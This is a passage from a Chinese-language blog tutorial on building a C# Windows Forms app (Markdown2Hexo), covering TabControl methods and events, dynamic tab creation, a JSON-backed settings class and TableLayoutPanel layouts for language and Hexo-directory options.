<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.SelectTab(<span class="number">1</span>); <span class="comment">// 选择第2个选项卡（索引从0开始）</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>SelectTab(string tabName)</code></strong></p>
<p>通过选项卡的名称选择某个 <code>TabPage</code>。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.SelectTab(<span class="string">&quot;TabName&quot;</span>); <span class="comment">// 选择名称为 &quot;TabName&quot; 的选项卡</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>ContainsKey(string key)</code></strong></p>
<p>判断某个 <code>TabPage</code> 是否存在，基于其 <code>Name</code> 属性。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="built_in">bool</span> exists = tabControl.TabPages.ContainsKey(<span class="string">&quot;TabName&quot;</span>);</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Find(string key, bool searchAllTabs)</code></strong></p>
<p>查找具有指定名称的 <code>TabPage</code>，可以指定是否在所有选项卡中查找。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">TabPage foundTab = tabControl.TabPages.Find(<span class="string">&quot;TabName&quot;</span>, <span class="literal">true</span>)[<span class="number">0</span>];</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>EnableDoubleBuffering()</code></strong></p>
<p>设置 <code>TabControl</code> 是否使用双缓冲机制（帮助避免闪烁）。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.DoubleBuffered = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p><strong>常用事件</strong></p>
<ol>
<li><p><strong><code>SelectedIndexChanged</code></strong></p>
<p>当选中的选项卡发生变化时触发该事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.SelectedIndexChanged += (s, e) =&gt; </span><br><span class="line">&#123;</span><br><span class="line">    MessageBox.Show(<span class="string">&quot;选项卡已切换&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Selecting</code></strong></p>
<p>当选项卡即将被选中时触发该事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Selecting += (s, e) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox.Show(<span class="string">&quot;选项卡正在被选择&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>Deselected</code></strong></p>
<p>当选项卡被取消选中时触发该事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.Deselected += (s, e) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox.Show(<span class="string">&quot;选项卡已取消选择&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><strong><code>TabIndexChanged</code></strong></p>
<p>当选项卡的索引发生变化时触发该事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line">tabControl.TabIndexChanged += (s, e) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    MessageBox.Show(<span class="string">&quot;选项卡索引发生变化&quot;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div></li>
</ol>
<p>具体实现</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.cs</span></span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.ComponentModel;</span><br><span class="line"><span class="keyword">using</span> System.Data;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">partial</span> <span class="keyword">class</span> <span class="title">Form1</span> : <span class="title">Form</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 用于保存选中的文件夹路径</span></span><br><span class="line">        <span class="keyword">private</span> <span class="built_in">string</span> selectedFilePath;</span><br><span class="line">        <span class="keyword">private</span> TabControl tabControl;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Form1</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            InitializeComponent();</span><br><span class="line">            InitializeCustomComponents();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">		<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">SettingsToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            AddTab(<span class="string">&quot;Settings&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">HelpToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            AddTab(<span class="string">&quot;Help&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 动态创建一个 TabPage，并添加到 TabControl</span></span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddTab</span>(<span class="params"><span class="built_in">string</span> tabName</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 检查该 TabPage 是否已经存在</span></span><br><span class="line">            <span class="keyword">if</span> (tabControl.TabPages.ContainsKey(tabName))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 如果已经存在，直接选中它</span></span><br><span class="line">                tabControl.SelectedTab = tabControl.TabPages[tabName];</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 创建新的 TabPage</span></span><br><span class="line">            TabPage newTab = <span class="keyword">new</span> TabPage(tabName)</span><br><span class="line">            &#123;</span><br><span class="line">                Name = tabName</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 给 TabPage 添加内容</span></span><br><span class="line">            Label label = <span class="keyword">new</span> Label</span><br><span class="line">            &#123;</span><br><span class="line">                Text = <span class="string">$&quot;<span class="subst">&#123;tabName&#125;</span> Content&quot;</span>,</span><br><span class="line">                Dock = DockStyle.Fill,</span><br><span class="line">                TextAlign = ContentAlignment.MiddleCenter</span><br><span class="line">            &#125;;</span><br><span class="line">            newTab.Controls.Add(label);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 将 TabPage 添加到 TabControl</span></span><br><span class="line">            tabControl.TabPages.Add(newTab);</span><br><span class="line">            tabControl.SelectedTab = newTab;  <span class="comment">// 自动选择新创建的 TabPage</span></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.Designer.cs</span></span><br><span class="line">...</span><br><span class="line">        <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">InitializeCustomComponents</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建 TabControl</span></span><br><span class="line">            tabControl = <span class="keyword">new</span> TabControl();</span><br><span class="line">            tabControl.Dock = DockStyle.Fill;  <span class="comment">// 将 TabControl 填充整个窗体</span></span><br><span class="line">            <span class="keyword">this</span>.Controls.Add(tabControl);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></div>

<p>此时我们点击Settings就可以更改主窗口的显示了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250125160006519.png"
                      class=""
                >



<h4 id="设置界面实现"><a href="#设置界面实现" class="headerlink" title="设置界面实现"></a>设置界面实现</h4><p>这里由于settings是一块单独的逻辑设置，我们可以将其提取为一个单独的类，并且使用json来管理设置项。那么我们之后在主程序中要用到设置的内容时，只需要示例化设置对象并读取对应属性即可。而且可以在这个类中实现每一条配置的面板（包括标签与输入框或选项框）的返回。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> System.Linq;</span><br><span class="line"><span class="keyword">using</span> System.Text;</span><br><span class="line"><span class="keyword">using</span> System.Threading.Tasks;</span><br><span class="line"><span class="keyword">using</span> Newtonsoft.Json;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"><span class="keyword">using</span> System.Drawing;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Markdown2Hexo</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">SettingsData</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Language &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> SelectedTheme &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> HexoDirectory &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Settings</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 设置项</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> Language &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;    <span class="comment">// 语言选项</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> SelectedTheme &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;   <span class="comment">// 主题选项</span></span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">string</span> HexoDirectory &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;       <span class="comment">// Hexo 目录路径</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">string</span> settingsFilePath = <span class="string">&quot;settings.json&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> SettingsData settingsData;</span><br><span class="line">        <span class="keyword">public</span> ComboBox optionLanguage &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;    <span class="comment">// 多选框控件</span></span><br><span class="line">        <span class="keyword">public</span> TextBox hexoDirectoryTextBox &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;   <span class="comment">// 文本框控件</span></span><br><span class="line">        <span class="keyword">public</span> Button browseButton &#123; <span class="keyword">get</span>; <span class="keyword">private</span> <span class="keyword">set</span>; &#125;    <span class="comment">// 按钮控件</span></span><br><span class="line">        <span class="comment">// 构造函数</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">Settings</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 加载设置</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LoadSettings</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (File.Exists(settingsFilePath))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">string</span> json = File.ReadAllText(settingsFilePath);</span><br><span class="line">                <span class="keyword">var</span> settings = JsonConvert.DeserializeObject&lt;Settings&gt;(json);</span><br><span class="line">                <span class="keyword">this</span>.Language = settings.Language;</span><br><span class="line">                <span class="keyword">this</span>.SelectedTheme = settings.SelectedTheme;</span><br><span class="line">                <span class="keyword">this</span>.HexoDirectory = settings.HexoDirectory;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 保存设置</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">SaveSettings</span>()</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 创建一个新的对象，只包含需要序列化的设置项</span></span><br><span class="line">            settingsData = <span class="keyword">new</span> SettingsData</span><br><span class="line">            &#123;</span><br><span class="line">                Language = <span class="keyword">this</span>.Language,</span><br><span class="line">                SelectedTheme = <span class="keyword">this</span>.SelectedTheme,</span><br><span class="line">                HexoDirectory = <span class="keyword">this</span>.HexoDirectory</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">string</span> json = JsonConvert.SerializeObject(settingsData, Formatting.Indented);</span><br><span class="line">            File.WriteAllText(settingsFilePath, json);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>这里我们设置<strong>SettingsData</strong>这个类的原因在于后面保存设置时，如果直接把<strong>Settings</strong>这个含有各个控件的类进行序列化，会遇到一个自引用循环。具体来说，<code>ComboBox</code> 控件中的某些属性（例如 <code>AccessibilityObject</code>）可能包含对该控件本身的引用，导致在序列化时发生死循环。所以这里我们把其设置属性全部提取到<strong>SettingsData</strong>来避免上述错误发生。</p>
<p>需要注意的是，settings.js的输出目录为<strong>projectdir&#x2F;bin&#x2F;Debug&#x2F;settings.json</strong>，我们如果需要手动赋个初值，也需要在这个目录下创建，而不是直接用visual studio的创建文件功能。</p>
<h5 id="布局设计"><a href="#布局设计" class="headerlink" title="布局设计"></a>布局设计</h5><p>由于我们有很多选项需要显示在窗口中，所以我们要利用<strong>TableLayoutPanel</strong>、<strong>FlowLayoutPanel</strong>等布局控件来优化布局，不然一个一个设置坐标，还要想办法根据屏幕尺寸自适应，会相当麻烦。进阶一点可以使用 <strong>GroupBox</strong> 或者 <strong>TabControl</strong> 来进行更细化的分组。这里我们目前需要的选项较少，就先只用<strong>TableLayoutPanel</strong>进行布局。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddTab</span>(<span class="params"><span class="built_in">string</span> tabName</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 检查该 TabPage 是否已经存在</span></span><br><span class="line">    <span class="keyword">if</span> (tabControl.TabPages.ContainsKey(tabName))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果已经存在，直接选中它</span></span><br><span class="line">        tabControl.SelectedTab = tabControl.TabPages[tabName];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建新的 TabPage</span></span><br><span class="line">    TabPage newTab = <span class="keyword">new</span> TabPage(tabName)</span><br><span class="line">    &#123;</span><br><span class="line">        Name = tabName</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 布局设计</span></span><br><span class="line">    TableLayoutPanel tableLayoutPanel = <span class="keyword">new</span> TableLayoutPanel</span><br><span class="line">    &#123;</span><br><span class="line">        RowCount = <span class="number">5</span>, <span class="comment">// 设置行数，根据实际需要调整</span></span><br><span class="line">        ColumnCount = <span class="number">2</span>, <span class="comment">// 设置列数，通常是 2 列</span></span><br><span class="line">        Dock = DockStyle.Fill</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据选中的菜单来切换视图</span></span><br><span class="line">    <span class="keyword">switch</span> (tabName)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;File&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Help&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Settings&quot;</span>:</span><br><span class="line">            Settings settings = <span class="keyword">new</span> Settings();     <span class="comment">//获取设置属性</span></span><br><span class="line">            settings.LoadSettings();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            tableLayoutPanel.Controls.Add(settings.CreateLanguageSetting(), <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">            tableLayoutPanel.Controls.Add(settings.CreateHexoDirectorySetting(), <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            newTab.Controls.Add(tableLayoutPanel);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Plugins&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将 TabPage 添加到 TabControl</span></span><br><span class="line">    tabControl.TabPages.Add(newTab);</span><br><span class="line">    tabControl.SelectedTab = newTab;  <span class="comment">// 自动选择新创建的 TabPage</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里的<strong>OptionLanguageComboBox</strong>方法我们在下文中会给出具体实现。</p>
<h5 id="语言切换功能"><a href="#语言切换功能" class="headerlink" title="语言切换功能"></a>语言切换功能</h5><p>目的是能够支持中文和英文两种语言。这里我们打算在 <code>Settings</code> 的 <code>TabPage</code> 中渲染一个选项条，点击后展示待选项，并且实现鼠标悬停时高亮显示选项。</p>
<p>在Settings.cs中加入如下几个方法：</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Control <span class="title">CreateLanguageSetting</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建 TableLayoutPanel</span></span><br><span class="line">    TableLayoutPanel tableLayoutPanel = <span class="keyword">new</span> TableLayoutPanel</span><br><span class="line">    &#123;</span><br><span class="line">        ColumnCount = <span class="number">2</span>, <span class="comment">// 创建两列，第一列放 Label，第二列放 ComboBox</span></span><br><span class="line">        RowCount = <span class="number">1</span>, <span class="comment">// 只有一行</span></span><br><span class="line">        Dock = DockStyle.Fill,</span><br><span class="line">        AutoSize = <span class="literal">true</span> <span class="comment">// 自动适应大小</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置列宽度比例</span></span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">20</span>)); </span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">60</span>)); </span><br><span class="line"></span><br><span class="line">    Label label1 = <span class="keyword">new</span> Label</span><br><span class="line">    &#123;</span><br><span class="line">        Text = <span class="string">&quot;Language&quot;</span>,</span><br><span class="line">        TextAlign = ContentAlignment.MiddleLeft,  <span class="comment">// 设置文字在 Label 中垂直和水平居中</span></span><br><span class="line">        Dock = DockStyle.Fill  <span class="comment">// 使 Label 填满单元格</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    optionLanguage = <span class="keyword">new</span> ComboBox</span><br><span class="line">    &#123;</span><br><span class="line">        Name = <span class="string">&quot;Language&quot;</span>, <span class="comment">// 设置 Name</span></span><br><span class="line">        DropDownStyle = ComboBoxStyle.DropDownList,</span><br><span class="line">        Width = <span class="number">200</span>,</span><br><span class="line">        Location = <span class="keyword">new</span> Point(<span class="number">30</span>, <span class="number">50</span>)</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    optionLanguage.Items.Add(<span class="string">&quot;zh&quot;</span>);</span><br><span class="line">    optionLanguage.Items.Add(<span class="string">&quot;en&quot;</span>);</span><br><span class="line">    <span class="built_in">int</span> index = optionLanguage.Items.IndexOf(Language);</span><br><span class="line">    <span class="keyword">if</span> (index != <span class="number">-1</span>)</span><br><span class="line">        optionLanguage.SelectedIndex = index;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        optionLanguage.SelectedIndex = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    optionLanguage.SelectedIndexChanged += ComboBox_SelectedIndexChanged;</span><br><span class="line"></span><br><span class="line">    tableLayoutPanel.Controls.Add(label1);</span><br><span class="line">    tableLayoutPanel.Controls.Add(optionLanguage);</span><br><span class="line">    <span class="keyword">return</span> tableLayoutPanel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ComboBox 的选项变化事件处理方法</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ComboBox_SelectedIndexChanged</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 将 sender 强制转换为 ComboBox，以便访问其属性</span></span><br><span class="line">    ComboBox comboBox = sender <span class="keyword">as</span> ComboBox;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (comboBox != <span class="literal">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取选中的索引</span></span><br><span class="line">        <span class="built_in">int</span> selectedIndex = comboBox.SelectedIndex;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 显示相应的多选框面板</span></span><br><span class="line">        ChangeAndSave(selectedIndex, comboBox.Name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法：切换选项并保存设置</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ChangeAndSave</span>(<span class="params"><span class="built_in">int</span> selectedIndex, <span class="built_in">string</span> settingType</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">switch</span> (settingType)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;Language&quot;</span>:</span><br><span class="line">            <span class="comment">// MessageBox.Show($&quot;选项已设置：&quot; + optionLanguage.Items[selectedIndex].ToString());</span></span><br><span class="line">            <span class="keyword">this</span>.Language = optionLanguage.Items[selectedIndex].ToString();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;SelectedTheme&quot;</span>:</span><br><span class="line">            <span class="keyword">this</span>.SelectedTheme = optionLanguage.Items[selectedIndex].ToString();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 保存到文件</span></span><br><span class="line">    SaveSettings();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>这里内部也是使用<strong>TableLayoutPanel</strong>进行布局，可以通过<strong>ColumnStyles</strong>设置列宽度，从而在一行中对标签以及选项框进行布局</p>
<p>可以看到已经成功的渲染出了选项标签与选择框。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250127003008032.png"
                      class=""
                >

<h5 id="Hexo目录设置"><a href="#Hexo目录设置" class="headerlink" title="Hexo目录设置"></a>Hexo目录设置</h5><div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Control <span class="title">CreateHexoDirectorySetting</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建 TableLayoutPanel</span></span><br><span class="line">    TableLayoutPanel tableLayoutPanel = <span class="keyword">new</span> TableLayoutPanel</span><br><span class="line">    &#123;</span><br><span class="line">        ColumnCount = <span class="number">3</span>, <span class="comment">// 创建三列，第一列放 Label，第二列放 TextBox，第三列放 Button</span></span><br><span class="line">        RowCount = <span class="number">1</span>, <span class="comment">// 只有一行</span></span><br><span class="line">        Dock = DockStyle.Fill,</span><br><span class="line">        AutoSize = <span class="literal">true</span> <span class="comment">// 自动适应大小</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置列宽度（比例为 2:5:1）</span></span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">20</span>)); <span class="comment">// 第一列：20%</span></span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">60</span>)); <span class="comment">// 第二列：60%</span></span><br><span class="line">    tableLayoutPanel.ColumnStyles.Add(<span class="keyword">new</span> ColumnStyle(SizeType.Percent, <span class="number">20</span>)); <span class="comment">// 第三列：20%</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建提示文字</span></span><br><span class="line">    Label label1 = <span class="keyword">new</span> Label</span><br><span class="line">    &#123;</span><br><span class="line">        Text = <span class="string">&quot;Hexo Directory&quot;</span>,</span><br><span class="line">        TextAlign = ContentAlignment.MiddleLeft, <span class="comment">// 使文字左对齐</span></span><br><span class="line">        Dock = DockStyle.Fill <span class="comment">// 使 Label 填充其所在的单元格</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建文本框</span></span><br><span class="line">    hexoDirectoryTextBox = <span class="keyword">new</span> TextBox</span><br><span class="line">    &#123;</span><br><span class="line">        Text = <span class="keyword">this</span>.HexoDirectory, <span class="comment">// 显示已有的 Hexo 目录路径</span></span><br><span class="line">        Dock = DockStyle.Fill</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建浏览按钮</span></span><br><span class="line">    browseButton = <span class="keyword">new</span> Button</span><br><span class="line">    &#123;</span><br><span class="line">        Text = <span class="string">&quot;Browse&quot;</span>,</span><br><span class="line">        Dock = DockStyle.Fill</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 浏览按钮点击事件</span></span><br><span class="line">    browseButton.Click += BrowseButton_Click;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将控件添加到 TableLayoutPanel 中</span></span><br><span class="line">    tableLayoutPanel.Controls.Add(label1, <span class="number">0</span>, <span class="number">0</span>); <span class="comment">// 添加 Label 到第一列</span></span><br><span class="line">    tableLayoutPanel.Controls.Add(hexoDirectoryTextBox, <span class="number">1</span>, <span class="number">0</span>); <span class="comment">// 添加 TextBox 到第二列</span></span><br><span class="line">    tableLayoutPanel.Controls.Add(browseButton, <span class="number">2</span>, <span class="number">0</span>); <span class="comment">// 添加 Button 到第三列</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tableLayoutPanel;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 浏览按钮点击事件处理</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">BrowseButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">using</span> (FolderBrowserDialog folderDialog = <span class="keyword">new</span> FolderBrowserDialog())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 设置初始文件夹路径为当前路径</span></span><br><span class="line">        folderDialog.SelectedPath = hexoDirectoryTextBox.Text;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 弹出文件夹选择框</span></span><br><span class="line">        <span class="keyword">if</span> (folderDialog.ShowDialog() == DialogResult.OK)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 设置 TextBox 为选择的文件夹路径</span></span><br><span class="line">            MessageBox.Show(<span class="string">&quot;Hexo directory has been set to &quot;</span> + folderDialog.SelectedPath);</span><br><span class="line">            hexoDirectoryTextBox.Text = folderDialog.SelectedPath;</span><br><span class="line">            HexoDirectory = folderDialog.SelectedPath;</span><br><span class="line">        &#125;</span><br><span class="line">        SaveSettings();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查用户输入的路径是否有效</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">bool</span> <span class="title">ValidateHexoDirectory</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> path = hexoDirectoryTextBox.Text;</span><br><span class="line">    <span class="keyword">if</span> (Directory.Exists(path))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">this</span>.HexoDirectory = path;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>; <span class="comment">// 路径有效</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox.Show(<span class="string">&quot;Invalid Hexo directory. Please select a valid path.&quot;</span>);</span><br><span 